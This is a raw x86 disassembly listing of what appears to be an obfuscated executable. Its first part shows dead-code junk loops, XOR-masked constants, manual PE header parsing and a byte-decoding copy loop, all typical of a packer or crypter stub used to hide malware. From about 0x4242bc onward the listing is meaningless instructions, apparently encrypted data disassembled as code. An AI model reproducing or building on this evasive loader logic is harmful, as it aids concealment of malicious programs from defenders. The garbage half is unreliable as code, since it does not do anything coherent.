  423da4:	imul   eax,eax,0x300000
  423daa:	cmp    eax,0x1b00000
  423daf:	jne    0x422c5a
  423db5:	lea    eax,[esp+0x78]
  423db9:	push   eax
  423dba:	push   0xffffffff
  423dbc:	call   DWORD PTR ds:0x42b30a
  423dc2:	test   eax,eax
  423dc4:	jne    0x422c5a
  423dca:	mov    eax,ds:0x42a472
  423dcf:	push   0x4
  423dd1:	add    eax,0x1cc
  423dd6:	push   eax
  423dd7:	lea    eax,[esp+0x3c]
  423ddb:	push   eax
  423ddc:	call   0x423df0
  423de1:	mov    eax,DWORD PTR [esp+0x34]
  423de5:	mov    eax,DWORD PTR [eax]
  423de7:	pop    edi
  423de8:	pop    esi
  423de9:	pop    ebx
  423dea:	mov    esp,ebp
  423dec:	pop    ebp
  423ded:	ret    0xc
  423df0:	push   ebp
  423df1:	mov    ebp,esp
  423df3:	sub    esp,0x10
  423df6:	mov    eax,0xf89c85a5
  423dfb:	mov    DWORD PTR ds:0x42b222,0x14
  423e05:	cmp    DWORD PTR ds:0x42b222,0x0
  423e0c:	je     0x423e66
  423e12:	cmp    DWORD PTR ds:0x42b222,0x9
  423e19:	jbe    0x423e66
  423e1f:	jmp    0x423e38
  423e24:	push   0x42a03d
  423e29:	push   0x1
  423e2b:	push   0x1
  423e2d:	push   0x14be
  423e32:	call   DWORD PTR ds:0x42b2ee
  423e38:	cmp    DWORD PTR ds:0x42b222,0xa
  423e3f:	jne    0x423e54
  423e45:	xor    edx,edx
  423e47:	add    edx,DWORD PTR ds:0x42b222
  423e4d:	dec    edx
  423e4e:	mov    DWORD PTR ds:0x42b222,edx
  423e54:	mov    edx,DWORD PTR ds:0x42b222
  423e5a:	dec    edx
  423e5b:	mov    DWORD PTR ds:0x42b222,edx
  423e61:	jmp    0x423e05
  423e66:	mov    DWORD PTR [ebp-0x4],eax
  423e69:	and    DWORD PTR ds:0x42b1fa,0x0
  423e73:	jmp    0x423e85
  423e78:	mov    edx,DWORD PTR ds:0x42b1fa
  423e7e:	inc    edx
  423e7f:	mov    DWORD PTR ds:0x42b1fa,edx
  423e85:	cmp    DWORD PTR ds:0x42b1fa,0x19
  423e8c:	jae    0x423ece
  423e92:	cmp    DWORD PTR ds:0x42b1fa,0xc
  423e99:	jg     0x423ece
  423e9f:	jmp    0x423eaf
  423ea4:	push   0x863f
  423ea9:	call   DWORD PTR ds:0x42b2f2
  423eaf:	cmp    DWORD PTR ds:0x42b1fa,0xb
  423eb6:	jne    0x423ec9
  423ebc:	mov    edx,DWORD PTR ds:0x42b1fa
  423ec2:	inc    edx
  423ec3:	mov    DWORD PTR ds:0x42b1fa,edx
  423ec9:	jmp    0x423e78
  423ece:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  423ed5:	mov    edx,DWORD PTR ds:0x42b1aa
  423edb:	or     edx,DWORD PTR ds:0x42b1da
  423ee1:	mov    DWORD PTR ds:0x42b1aa,edx
  423ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  423eea:	not    edx
  423eec:	push   esi
  423eed:	and    edx,esi
  423eef:	mov    edx,0x75108ae
  423ef4:	xor    ecx,edx
  423ef6:	adc    DWORD PTR ds:0x42b18e,ebx
  423efc:	mov    esi,0x3272f5
  423f01:	and    DWORD PTR ds:0x42b186,0x14f5
  423f0b:	push   edi
  423f0c:	adc    edi,DWORD PTR ds:0x42b1c2
  423f12:	mov    edi,DWORD PTR [ebp+0x10]
  423f15:	xor    DWORD PTR ds:0x42b1fa,0x42b1ce
  423f1f:	add    ecx,esi
  423f21:	mov    DWORD PTR ds:0x42b1da,0x1b10
  423f2b:	cmp    ecx,edi
  423f2d:	mov    DWORD PTR ds:0x42b1d6,0x199
  423f37:	je     0x42401c
  423f3d:	xor    edi,ecx
  423f3f:	mov    ecx,DWORD PTR [ebp-0x4]
  423f42:	sbb    DWORD PTR ds:0x42b202,0x792c
  423f4c:	mov    edi,DWORD PTR [ebp+0x10]
  423f4f:	sub    DWORD PTR ds:0x42b1ba,0xd36
  423f59:	xor    eax,eax
  423f5b:	xor    ecx,edx
  423f5d:	xor    DWORD PTR ds:0x42b216,0x49be
  423f67:	add    ecx,esi
  423f69:	add    edi,0xfabdbed4
  423f6f:	adc    eax,0xffffffff
  423f72:	xor    eax,0x0
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	push   ebx
  423f79:	xor    ebx,ebx
  423f7b:	xor    edi,0x8a29a141
  423f81:	mov    eax,ecx
  423f83:	add    eax,0xfabdbed4
  423f88:	adc    ebx,0xffffffff
  423f8b:	xor    eax,0x8a29a141
  423f90:	xor    ebx,0x0
  423f93:	cmp    eax,edi
  423f95:	jne    0x423fae
  423f9b:	cmp    ebx,DWORD PTR [ebp-0xc]
  423f9e:	je     0x424016
  423fa4:	jmp    0x423fae
  423fa9:	mov    esi,0x3272f5
  423fae:	mov    eax,DWORD PTR [ebp-0x4]
  423fb1:	mov    edi,DWORD PTR [ebp-0x8]
  423fb4:	xor    edi,edx
  423fb6:	add    edi,esi
  423fb8:	mov    esi,DWORD PTR [ebp+0x8]
  423fbb:	imul   edi,ecx
  423fbe:	mov    ebx,DWORD PTR [ebp+0xc]
  423fc1:	xor    eax,edx
  423fc3:	add    eax,ecx
  423fc5:	mov    al,BYTE PTR [ebx+eax*1+0x3272f5]
  423fcc:	mov    BYTE PTR [edi+esi*1],al
  423fcf:	mov    eax,DWORD PTR [ebp-0x8]
  423fd2:	mov    esi,DWORD PTR [ebp+0x10]
  423fd5:	xor    eax,edx
  423fd7:	xor    ebx,ebx
  423fd9:	add    esi,0xfabdbed4
  423fdf:	adc    ebx,0xffffffff
  423fe2:	lea    ecx,[ecx+eax*1+0x3272f5]
  423fe9:	xor    edi,edi
  423feb:	xor    esi,0x8a29a141
  423ff1:	xor    ebx,0x0
  423ff4:	mov    eax,ecx
  423ff6:	add    eax,0xfabdbed4
  423ffb:	adc    edi,0xffffffff
  423ffe:	xor    eax,0x8a29a141
  424003:	xor    edi,0x0
  424006:	cmp    eax,esi
  424008:	jne    0x423fa9
  42400e:	cmp    edi,ebx
  424010:	jne    0x423fa9
  424016:	mov    eax,0xf89c85a2
  42401b:	pop    ebx
  42401c:	pop    edi
  42401d:	pop    esi
  42401e:	leave  
  42401f:	ret    0xc
  424022:	push   ebp
  424023:	mov    ebp,esp
  424025:	push   ecx
  424026:	and    DWORD PTR ds:0x42b19e,0x0
  424030:	jmp    0x424043
  424035:	xor    eax,eax
  424037:	xor    eax,DWORD PTR ds:0x42b19e
  42403d:	inc    eax
  42403e:	mov    ds:0x42b19e,eax
  424043:	cmp    DWORD PTR ds:0x42b19e,0x14
  42404a:	jae    0x424072
  424050:	cmp    DWORD PTR ds:0x42b19e,0x1e
  424057:	jg     0x424072
  42405d:	jmp    0x42406d
  424062:	push   0x42b182
  424067:	call   DWORD PTR ds:0x42b2f6
  42406d:	jmp    0x424035
  424072:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424079:	and    DWORD PTR ds:0x42b1b2,0x0
  424083:	xor    ecx,ecx
  424085:	xor    ecx,DWORD PTR ds:0x42b1b2
  42408b:	inc    ecx
  42408c:	mov    DWORD PTR ds:0x42b1b2,ecx
  424092:	cmp    DWORD PTR ds:0x42b1b2,0x4
  424099:	jle    0x4240e5
  42409f:	jmp    0x4240be
  4240a4:	push   0x42b206
  4240a9:	push   0x42b1c6
  4240ae:	push   0x6e36
  4240b3:	push   0x42a0fe
  4240b8:	call   DWORD PTR ds:0x42b2fa
  4240be:	cmp    DWORD PTR ds:0x42b1b2,0x3
  4240c5:	jne    0x4240d8
  4240cb:	mov    ecx,DWORD PTR ds:0x42b1b2
  4240d1:	inc    ecx
  4240d2:	mov    DWORD PTR ds:0x42b1b2,ecx
  4240d8:	cmp    DWORD PTR ds:0x42b1b2,0x1b
  4240df:	jb     0x424083
  4240e5:	mov    eax,DWORD PTR [ebp+0x8]
  4240e8:	movsx  eax,BYTE PTR [eax]
  4240eb:	mov    edx,0x3272f5
  4240f0:	sub    eax,edx
  4240f2:	mov    ecx,0x75108ae
  4240f7:	xor    eax,ecx
  4240f9:	cmp    eax,0xf89c85f6
  4240fe:	jne    0x42412d
  424104:	mov    eax,DWORD PTR [ebp+0x8]
  424107:	push   esi
  424108:	mov    esi,DWORD PTR [ebp+0x8]
  42410b:	add    esi,DWORD PTR [eax+0x3c]
  42410e:	mov    DWORD PTR [ebp+0x8],esi
  424111:	mov    eax,DWORD PTR [ebp-0x4]
  424114:	mov    esi,DWORD PTR [ebp+0x8]
  424117:	xor    eax,ecx
  424119:	add    eax,edx
  42411b:	cmp    DWORD PTR [esi+0x54],eax
  42411e:	pop    esi
  42411f:	je     0x42412d
  424125:	mov    eax,DWORD PTR [ebp+0x8]
  424128:	jmp    0x424134
  42412d:	mov    eax,DWORD PTR [ebp-0x4]
  424130:	xor    eax,ecx
  424132:	add    eax,edx
  424134:	leave  
  424135:	ret    0x4
  424138:	push   ebp
  424139:	mov    ebp,esp
  42413b:	sub    esp,0xc
  42413e:	and    DWORD PTR ds:0x42b1c6,0x0
  424148:	jmp    0x42415a
  42414d:	mov    edx,DWORD PTR ds:0x42b1c6
  424153:	inc    edx
  424154:	mov    DWORD PTR ds:0x42b1c6,edx
  42415a:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  424161:	jae    0x4241a8
  424167:	cmp    DWORD PTR ds:0x42b1c6,0xd
  42416e:	jle    0x4241a8
  424174:	jmp    0x424189
  424179:	push   0x42b216
  42417e:	push   0x42a1f3
  424183:	call   DWORD PTR ds:0x42b2fe
  424189:	cmp    DWORD PTR ds:0x42b1c6,0xc
  424190:	jne    0x4241a3
  424196:	mov    edx,DWORD PTR ds:0x42b1c6
  42419c:	inc    edx
  42419d:	mov    DWORD PTR ds:0x42b1c6,edx
  4241a3:	jmp    0x42414d
  4241a8:	push   esi
  4241a9:	and    DWORD PTR ds:0x42b222,0x0
  4241b3:	xor    esi,esi
  4241b5:	or     esi,DWORD PTR ds:0x42b222
  4241bb:	inc    esi
  4241bc:	mov    DWORD PTR ds:0x42b222,esi
  4241c2:	cmp    DWORD PTR ds:0x42b222,0x7
  4241c9:	jl     0x424211
  4241cf:	jmp    0x4241ea
  4241d4:	push   DWORD PTR [ebp-0x28]
  4241d7:	push   DWORD PTR [ebp-0x24]
  4241da:	push   0x42a1b7
  4241df:	push   0x400000
  4241e4:	call   DWORD PTR ds:0x42b306
  4241ea:	cmp    DWORD PTR ds:0x42b222,0x6
  4241f1:	jne    0x424204
  4241f7:	mov    esi,DWORD PTR ds:0x42b222
  4241fd:	inc    esi
  4241fe:	mov    DWORD PTR ds:0x42b222,esi
  424204:	cmp    DWORD PTR ds:0x42b222,0x15
  42420b:	jb     0x4241b3
  424211:	mov    esi,0xf89c85a5
  424216:	or     DWORD PTR ds:0x42b1d6,0x459e
  424220:	mov    DWORD PTR [ebp-0x8],esi
  424223:	and    DWORD PTR ds:0x42b1d6,0x0
  42422d:	jmp    0x424241
  424232:	xor    ecx,ecx
  424234:	xor    ecx,DWORD PTR ds:0x42b1d6
  42423a:	inc    ecx
  42423b:	mov    DWORD PTR ds:0x42b1d6,ecx
  424241:	cmp    DWORD PTR ds:0x42b1d6,0x1c
  424248:	jae    0x42428f
  42424e:	cmp    DWORD PTR ds:0x42b1d6,0xf
  424255:	jge    0x42428f
  42425b:	jmp    0x424270
  424260:	push   0x42a1a1
  424265:	push   0x0
  424267:	push   DWORD PTR [ebp-0x20]
  42426a:	call   DWORD PTR ds:0x42b30e
  424270:	cmp    DWORD PTR ds:0x42b1d6,0xe
  424277:	jne    0x42428a
  42427d:	mov    ecx,DWORD PTR ds:0x42b1d6
  424283:	inc    ecx
  424284:	mov    DWORD PTR ds:0x42b1d6,ecx
  42428a:	jmp    0x424232
  42428f:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424296:	push   edi
  424297:	mov    eax,eax
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	mov    edi,DWORD PTR [ebp-0x8]
  42429f:	mov    ecx,0x75108ae
  4242a4:	xor    eax,ecx
  4242a6:	xor    edi,ecx
  4242a8:	mov    edx,0x3272f5
  4242ad:	add    edi,edx
  4242af:	add    eax,edx
  4242b1:	imul   eax,edi
  4242b4:	mov    edi,DWORD PTR [ebp+0xc]
  4242b7:	jmp    0x4258b4
  4242bc:	jge    0x42427f
  4242be:	jnp    0x42427a
  4242c0:	mov    bh,0xb2
  4242c2:	mov    dl,0xbe
  4242c4:	jmp    0xa82776ec
  4242c9:	loope  0x42431e
  4242cb:	push   esi
  4242cc:	xchg   edx,eax
  4242cd:	xchg   ebp,eax
  4242ce:	add    BYTE PTR [ebx-0x7c7c935d],0xcd
  4242d5:	sbb    dl,bh
  4242d7:	jle    0x4242ea
  4242d9:	in     eax,0xaa
  4242db:	or     ebx,edx
  4242dd:	cld    
  4242de:	mov    edx,0xe37ec89f
  4242e3:	popa   
  4242e4:	mov    esp,0x28beb98b
  4242e9:	ins    DWORD PTR es:[edi],dx
  4242ea:	push   cs
  4242eb:	ja     0x424317
  4242ed:	fiadd  WORD PTR [esi-0x2b]
  4242f0:	in     eax,dx
  4242f1:	gs xchg ecx,eax
  4242f3:	xor    eax,DWORD PTR [ebx-0xc099f64]
  4242f9:	mov    WORD PTR ds:0xa180bd7b,gs
  4242ff:	or     eax,0x6897f942
  424304:	or     BYTE PTR [ebx+0x1],cl
  424307:	add    eax,0xec5ce0f0
  42430c:	sub    BYTE PTR [ecx-0x48df3a44],bh
  424312:	push   cs
  424313:	jo     0x4242fb
  424315:	sub    eax,0x2e9063bc
  42431a:	lahf   
  42431b:	ja     0x4242ba
  42431d:	mov    ah,0xd9
  42431f:	int3   
  424320:	fild   WORD PTR [eiz*8+0x629b501]
  424327:	cld    
  424328:	jle    0x42431d
  42432a:	sub    DWORD PTR [esi+ecx*1+0x68d5c03e],0xf86ae139
  424335:	ja     0x4243b1
  424337:	or     al,BYTE PTR [edx]
  424339:	add    eax,0x3f92ab23
  42433e:	not    BYTE PTR [edi-0x48]
  424341:	mov    dh,BYTE PTR [edi-0x3f]
  424344:	fwait
  424345:	imul   ebx,DWORD PTR [ecx],0xf4572af2
  42434b:	adc    eax,DWORD PTR [ecx-0x1]
  42434e:	adc    DWORD PTR [ebp-0x37],0x47876986
  424355:	pop    edi
  424356:	inc    edx
  424357:	and    al,0x15
  424359:	mov    ds:0x6f1df6d2,eax
  42435e:	ins    BYTE PTR es:[edi],dx
  42435f:	xchg   esp,eax
  424360:	or     eax,0xc5bb1300
  424365:	adc    eax,0x211370be
  42436a:	jbe    0x42431f
  42436c:	outs   dx,BYTE PTR ds:[esi]
  42436d:	leave  
  42436e:	lea    esp,[edx]
  424370:	pushf  
  424371:	push   ebp
  424372:	test   eax,0xeecbe48f
  424377:	xchg   DWORD PTR [eax+0x12dccf2c],ecx
  42437d:	sbb    DWORD PTR [esi],eax
  42437f:	or     eax,0x9a865735
  424384:	push   esi
  424385:	and    ecx,DWORD PTR [edi]
  424387:	push   edx
  424388:	pop    esi
  424389:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42438a:	in     al,0xb3
  42438c:	mov    cl,0x3f
  42438e:	pop    ebx
  42438f:	mov    dl,BYTE PTR [esi+0x6]
  424392:	loopne 0x42431f
  424394:	push   ebp
  424395:	je     0x42438f
  424397:	sub    bh,dl
  424399:	imul   eax,DWORD PTR [edx],0xdd7a8517
  42439f:	xor    bl,BYTE PTR [esi+0x76]
  4243a2:	shr    DWORD PTR [edx+0x90f2c77],0x97
  4243a9:	xor    DWORD PTR [edi+esi*8-0xb],0xd6431e02
  4243b1:	inc    edi
  4243b2:	mov    ?,WORD PTR [eax]
  4243b4:	inc    ah
  4243b6:	mov    al,ds:0x2ca53a37
  4243bb:	mov    ecx,DWORD PTR [eax+esi*4]
  4243be:	sahf   
  4243bf:	ins    DWORD PTR es:[edi],dx
  4243c0:	jne    0x4243de
  4243c2:	xlat   BYTE PTR ds:[ebx]
  4243c3:	shl    BYTE PTR [ebx-0x231154a],cl
  4243c9:	stos   DWORD PTR es:[edi],eax
  4243ca:	stos   DWORD PTR es:[edi],eax
  4243cb:	aad    0x43
  4243cd:	cmp    esi,DWORD PTR [ebp+0x2f]
  4243d0:	fbstp  TBYTE PTR [ebp+edi*2-0x72]
  4243d4:	or     ch,BYTE PTR [ebp+ebx*4+0x1f]
  4243d8:	in     eax,dx
  4243d9:	cld    
  4243da:	mov    ds:0xdebf5f5a,eax
  4243df:	dec    ebp
  4243e0:	sub    eax,0xb68d492f
  4243e5:	enter  0xd41b,0xf7
  4243e9:	push   ecx
  4243ea:	jnp    0x424436
  4243ec:	not    DWORD PTR [edi+0x47]
  4243ef:	mov    esp,0xca2524ba
  4243f4:	repz push ecx
  4243f6:	call   0x5cd22f4
  4243fb:	dec    esi
  4243fc:	mov    ah,0xc0
  4243fe:	sub    bh,BYTE PTR [ecx+0x25]
  424401:	or     eax,0xe8cec088
  424406:	push   esp
  424407:	dec    edx
  424408:	jp     0x42447b
  42440a:	bound  esi,QWORD PTR [ecx-0x29d0ca43]
  424410:	mov    bl,0xc2
  424412:	adc    BYTE PTR [ecx],0xbc
  424415:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424416:	cmp    al,0xb0
  424418:	daa    
  424419:	test   DWORD PTR [ebx],esp
  42441b:	mov    esi,0x9714e7d2
  424420:	call   0x3977f49b
  424425:	pop    es
  424426:	imul   edi,DWORD PTR [edi],0xf61b4c0c
  42442c:	sahf   
  42442d:	inc    edi
  42442e:	jo     0x4243f5
  424430:	jge    0x424419
  424432:	dec    esp
  424433:	and    eax,0xdabf992e
  424438:	dec    esp
  424439:	xchg   edi,eax
  42443a:	ret    
  42443b:	sti    
  42443c:	jp     0x4243e0
  42443e:	sbb    al,BYTE PTR [eax+0x40]
  424441:	cmc    
  424442:	outs   dx,BYTE PTR ds:[esi]
  424443:	cdq    
  424444:	sub    BYTE PTR [esi+esi*8+0x6560cd74],ch
  42444b:	inc    ecx
  42444c:	fwait
  42444d:	mov    ds:0x56ce6ad5,eax
  424452:	pop    ds
  424453:	xchg   esp,eax
  424454:	xchg   ecx,eax
  424455:	jmp    0xd238:0x5932
  42445b:	adc    ebp,DWORD PTR [eax+0x66]
  42445e:	repnz icebp 
  424460:	ja     0x424476
  424462:	add    eax,DWORD PTR [edi-0x80]
  424465:	repz clc 
  424467:	popa   
  424468:	pushf  
  424469:	jg     0x42448e
  42446b:	sub    ebx,esp
  42446d:	(bad)  [edx]
  42446f:	and    eax,0x5d646e69
  424474:	in     eax,0x4a
  424476:	and    DWORD PTR [edi],ecx
  424478:	jecxz  0x424440
  42447a:	adc    DWORD PTR [eax],edx
  42447c:	push   edi
  42447d:	sbb    DWORD PTR [ebx+0x7c],eax
  424480:	jle    0x42445f
  424482:	icebp  
  424483:	push   ss
  424484:	out    0x51,al
  424486:	adc    DWORD PTR [esi+0x3050f751],esp
  42448c:	outs   dx,DWORD PTR ds:[esi]
  42448d:	dec    ebx
  42448e:	mov    dh,0x61
  424490:	adc    ebp,esi
  424492:	inc    edx
  424493:	aam    0xf4
  424495:	in     eax,dx
  424496:	leave  
  424497:	das    
  424498:	add    DWORD PTR [eax-0x61792574],esp
  42449e:	call   0x303d7e32
  4244a3:	sub    eax,0x938fee84
  4244a8:	out    dx,al
  4244a9:	fdiv   st(4),st
  4244ab:	rcl    BYTE PTR [ebx+0x4d],1
  4244ae:	add    al,0xa9
  4244b0:	xchg   esp,eax
  4244b1:	fwait
  4244b2:	and    ax,0x4eff
  4244b6:	and    al,0x4d
  4244b8:	sbb    esp,DWORD PTR [edi+0x22]
  4244bb:	adc    BYTE PTR [ebx+0x51c8dc68],dh
  4244c1:	shl    esi,1
  4244c3:	ds and BYTE PTR ss:[ebx-0x60a5e0cf],bl
  4244cb:	mov    gs,WORD PTR [edx]
  4244cd:	das    
  4244ce:	dec    esi
  4244cf:	inc    DWORD PTR [ecx-0x40]
  4244d2:	mov    al,ds:0x715e0e5
  4244d7:	(bad)  
  4244d8:	aas    
  4244d9:	test   eax,0x2f50c4a2
  4244de:	call   0x5e02b43d
  4244e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244e4:	mov    BYTE PTR [ebx],al
  4244e6:	lock or eax,0x40fc1631
  4244ec:	add    ebp,DWORD PTR [ebx-0x4c]
  4244ef:	mov    bl,0x4
  4244f1:	inc    eax
  4244f2:	xchg   DWORD PTR [edi],esi
  4244f4:	(bad)  
  4244f5:	lods   al,BYTE PTR ds:[esi]
  4244f6:	push   ebp
  4244f8:	shl    DWORD PTR [ebp+0x57],1
  4244fb:	out    dx,al
  4244fc:	jo     0x4244d0
  4244fe:	jl     0x424569
  424500:	xchg   esi,eax
  424501:	sub    BYTE PTR [ecx+0x3],ah
  424504:	aad    0x7d
  424506:	or     BYTE PTR [edx],ch
  424508:	and    eax,0x7560548f
  42450d:	cmp    eax,0xd8eaf9b9
  424512:	int3   
  424513:	mov    dh,0xaf
  424515:	mov    ebp,0x6a30a186
  42451a:	pop    edi
  42451b:	bound  ebx,QWORD PTR [ebx+0x7e]
  42451e:	pop    ebx
  42451f:	lock or esp,DWORD PTR [ebp+0x158f73a4]
  424526:	xchg   ebp,eax
  424527:	in     al,dx
  424528:	fmul   st(6),st
  42452a:	dec    ecx
  42452b:	adc    al,BYTE PTR [edx+0x284734ed]
  424531:	and    BYTE PTR [esi-0x476821fa],0x95
  424538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424539:	int3   
  42453a:	(bad)  
  42453e:	mov    edx,0xd3e83582
  424543:	pusha  
  424544:	loop   0x4245a6
  424546:	adc    edx,DWORD PTR [ebp-0x24]
  424549:	push   esp
  42454a:	out    dx,al
  42454b:	dec    ebx
  42454c:	jle    0x424535
  42454e:	div    BYTE PTR [eax+0x2462724d]
  424554:	add    al,0x1f
  424556:	shl    BYTE PTR [ecx+eiz*8],1
  424559:	adc    bl,dl
  42455b:	mov    dl,BYTE PTR [edi+esi*1-0x4a6e13a6]
  424562:	jg     0x424533
  424564:	mov    eax,ds:0x3502e2a2
  424569:	mov    ds:0x6127aed3,eax
  42456e:	das    
  42456f:	stos   BYTE PTR es:[edi],al
  424570:	or     bh,0xa8
  424573:	jge    0x4245b8
  424575:	sbb    BYTE PTR [eax+0x4074b244],bl
  42457b:	dec    esp
  42457c:	sub    DWORD PTR ss:[edx],ebp
  42457f:	jecxz  0x42451b
  424581:	test   ecx,eax
  424583:	aam    0xa7
  424585:	mov    ds,WORD PTR [ebx-0x2]
  424588:	in     eax,dx
  424589:	jns    0x42456f
  42458b:	test   eax,0xf68af9e7
  424590:	in     eax,dx
  424591:	cmp    bh,BYTE PTR [edx]
  424593:	gs ds jmp 0x390a:0x572b2226
  42459c:	sub    eax,0xcdf4854c
  4245a1:	lods   eax,DWORD PTR ds:[esi]
  4245a2:	leave  
  4245a3:	int    0xc5
  4245a5:	mov    edi,0x7623cd2f
  4245aa:	sub    ecx,esi
  4245ac:	das    
  4245ad:	xor    bl,al
  4245af:	add    BYTE PTR [eax-0x4],0x8c
  4245b3:	cmp    DWORD PTR [edi],edx
  4245b5:	ret    0x5727
  4245b8:	adc    al,0xae
  4245ba:	mov    bl,0xb4
  4245bc:	xor    edi,eax
  4245be:	cli    
  4245bf:	or     ah,BYTE PTR [ebx]
  4245c1:	jmp    0xe4ba:0xf016a6e7
  4245c8:	push   es
  4245c9:	adc    ebp,ebp
  4245cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245cc:	adc    BYTE PTR [ecx-0x20dfc014],dh
  4245d2:	jp     0x424587
  4245d4:	icebp  
  4245d5:	inc    ebx
  4245d6:	cli    
  4245d7:	jns    0x424616
  4245d9:	ja     0x42455c
  4245db:	cmp    BYTE PTR [edi],dh
  4245dd:	dec    ebp
  4245de:	push   esp
  4245df:	sbb    ecx,ebx
  4245e1:	xor    DWORD PTR [esp+esi*8-0x5f],edi
  4245e5:	mov    esi,0x7ce88de2
  4245ea:	fwait
  4245eb:	dec    eax
  4245ec:	dec    esi
  4245ed:	ds pop ss
  4245ef:	push   esp
  4245f0:	shr    edi,cl
  4245f2:	sub    eax,0xb7126645
  4245f7:	mov    dl,0xdf
  4245f9:	or     DWORD PTR [eax],ebp
  4245fb:	dec    sp
  4245fd:	or     ecx,edi
  4245ff:	mov    gs,esp
  424601:	(bad)  
  424602:	hlt    
  424603:	icebp  
  424604:	outs   dx,DWORD PTR ds:[esi]
  424605:	fiadd  WORD PTR [esi+0x57809757]
  42460b:	sbb    DWORD PTR [eax+0x3016958c],eax
  424611:	xor    BYTE PTR [edi+edi*1+0x473a5257],ch
  424618:	dec    ecx
  424619:	std    
  42461a:	pop    ebx
  42461b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42461c:	xor    BYTE PTR [esi],cl
  42461e:	bound  edi,QWORD PTR [ecx]
  424620:	scas   al,BYTE PTR es:[edi]
  424621:	or     BYTE PTR [edi-0x4efd208c],dl
  424627:	fmul   QWORD PTR [ebp-0x6168f54a]
  42462d:	adc    al,0x0
  42462f:	sbb    DWORD PTR [esi+0x62f3d411],0xa8b99f30
  424639:	and    DWORD PTR [ecx],esi
  42463b:	lahf   
  42463c:	sub    esi,DWORD PTR [ebx]
  42463e:	fnstcw WORD PTR [ecx+0x299326cf]
  424644:	repnz inc eax
  424646:	(bad)  
  424647:	push   0xffffffcb
  424649:	jp     0x42466d
  42464b:	mov    esp,0x886aaac5
  424650:	push   ecx
  424651:	imul   si,dx,0x3785
  424656:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424657:	xor    eax,DWORD PTR [edx-0x74]
  42465a:	mov    ds,WORD PTR [edi]
  42465c:	dec    ebx
  42465d:	cmp    bh,BYTE PTR [esi-0x41]
  424660:	mov    al,0x62
  424662:	daa    
  424663:	jnp    0x4245fa
  424665:	cmp    DWORD PTR [ebp-0x7a],0x41
  424669:	add    eax,0x8110c89f
  42466e:	cwde   
  42466f:	adc    al,0x4b
  424671:	inc    ebp
  424672:	add    cl,ch
  424674:	pop    ebp
  424675:	stos   BYTE PTR es:[edi],al
  424676:	xlat   BYTE PTR ds:[ebx]
  424677:	jmp    0xdf9436e0
  42467c:	retf   
  42467d:	cmp    BYTE PTR [ecx+0x53],bh
  424680:	sub    BYTE PTR [ebx],cl
  424682:	(bad)  
  424683:	cmp    ah,BYTE PTR [ebp+0x222e4b58]
  424689:	xchg   edx,eax
  42468a:	inc    ebp
  42468b:	int3   
  42468c:	mov    ch,BYTE PTR [eax+edi*4-0x69d503ad]
  424693:	inc    BYTE PTR [edi+0x1a]
  424696:	pop    ss
  424697:	lods   al,BYTE PTR ds:[esi]
  424698:	les    ecx,FWORD PTR [eax-0x494ed25b]
  42469e:	in     al,0x5
  4246a0:	xchg   ebx,eax
  4246a1:	push   ebp
  4246a2:	pop    esi
  4246a3:	frstor [ebx-0x41]
  4246a6:	mov    cs,WORD PTR [edx+0x260b58ed]
  4246ac:	pop    edi
  4246ad:	aaa    
  4246ae:	pusha  
  4246af:	pop    ss
  4246b0:	inc    esi
  4246b1:	gs stc 
  4246b3:	aas    
  4246b4:	push   0x39
  4246b6:	shl    DWORD PTR [esi+0x5b6cc60b],0xf5
  4246bd:	(bad)  
  4246bf:	mov    ch,BYTE PTR [ecx]
  4246c1:	cmp    ebp,edi
  4246c3:	imul   ecx,DWORD PTR [esi+0x1ccbbc8b],0xffffff9f
  4246ca:	and    ah,BYTE PTR [eax]
  4246cc:	pop    ecx
  4246cd:	mov    DWORD PTR [edi-0x6313abca],edi
  4246d3:	in     al,dx
  4246d4:	and    al,0x63
  4246d6:	xchg   ebx,eax
  4246d7:	ins    DWORD PTR es:[edi],dx
  4246d8:	pop    es
  4246d9:	enter  0x4408,0x34
  4246dd:	xchg   esi,eax
  4246de:	xchg   DWORD PTR [ebx+0x7],esi
  4246e1:	or     eax,0xe7c7e068
  4246e6:	aas    
  4246e7:	stos   BYTE PTR es:[edi],al
  4246e8:	test   BYTE PTR [ebx-0x37],dh
  4246eb:	pop    es
  4246ec:	fs mov ecx,0xf8b81247
  4246f2:	or     DWORD PTR [eax-0x1c64d1c],ebx
  4246f8:	cld    
  4246f9:	in     eax,dx
  4246fa:	or     al,0x65
  4246fd:	jecxz  0x42469c
  4246ff:	pop    ebp
  424700:	std    
  424701:	int3   
  424702:	nop
  424703:	inc    edx
  424704:	and    bl,BYTE PTR [eax+0x1]
  424707:	pop    esi
  424708:	add    al,0xbb
  42470a:	cmpxchg DWORD PTR [eax-0x3a],eax
  42470e:	(bad)  
  42470f:	dec    edi
  424710:	cmc    
  424711:	sbb    BYTE PTR [ebx+0x38],bh
  424714:	shl    cl,cl
  424716:	pop    edx
  424717:	adc    al,0x6c
  424719:	inc    ebx
  42471a:	ss adc bl,0xf1
  42471e:	pop    esi
  42471f:	clc    
  424720:	cmp    bh,BYTE PTR [edx+0x3b8b6ae8]
  424726:	nop
  424727:	or     DWORD PTR [edx+esi*1],esi
  42472a:	mov    dl,0xb6
  42472c:	rcr    eax,cl
  42472e:	stc    
  42472f:	pop    esi
  424730:	lock or BYTE PTR [eax+0x93b4daf],0x56
  424738:	popa   
  424739:	adc    ch,BYTE PTR [edx-0x5ccd2121]
  42473f:	cmp    eax,0x8d119687
  424744:	in     al,0x9e
  424746:	loopne 0x4247a6
  424748:	or     BYTE PTR [ecx+0x4b],dh
  42474b:	loope  0x42474a
  42474d:	dec    edx
  42474e:	test   edi,0x2e7afd14
  424754:	add    DWORD PTR [ebx-0x69],edx
  424757:	pop    esi
  424758:	and    esi,0xbeb6629c
  42475e:	nop
  42475f:	test   eax,0xc83a4fa8
